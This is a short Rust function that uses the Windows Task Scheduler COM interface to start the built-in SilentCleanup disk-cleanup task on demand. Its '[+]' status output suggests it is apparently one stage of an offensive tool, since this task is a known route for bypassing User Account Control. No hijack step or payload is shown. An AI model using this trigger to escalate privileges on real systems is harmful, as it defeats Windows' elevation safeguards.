use std::ptr;
use windows::Win32::{
  Foundation::BSTR,
  System::{
    Com::{CoCreateInstance, CoInitialize, CoUninitialize, CLSCTX_INPROC_SERVER},
    TaskScheduler::{ITaskService, TaskScheduler, TASK_RUN_IGNORE_CONSTRAINTS},
  },
};

pub fn run_silent_cleanup_task() {
  println!("[+] Running the silent cleanup task...");

  unsafe { CoInitialize(ptr::null_mut()).unwrap() };

  unsafe {
    let task_service =
      CoCreateInstance::<_, ITaskService>(&TaskScheduler, None, CLSCTX_INPROC_SERVER).unwrap();

    task_service.Connect(None, None, None, None).unwrap();

    task_service
      .GetFolder(BSTR::from(r"\Microsoft\Windows\DiskCleanup"))
      .unwrap()
      .GetTask(BSTR::from("SilentCleanup"))
      .unwrap()
      .RunEx(None, TASK_RUN_IGNORE_CONSTRAINTS, 0, None)
      .unwrap()
  };

  unsafe { CoUninitialize() };
}
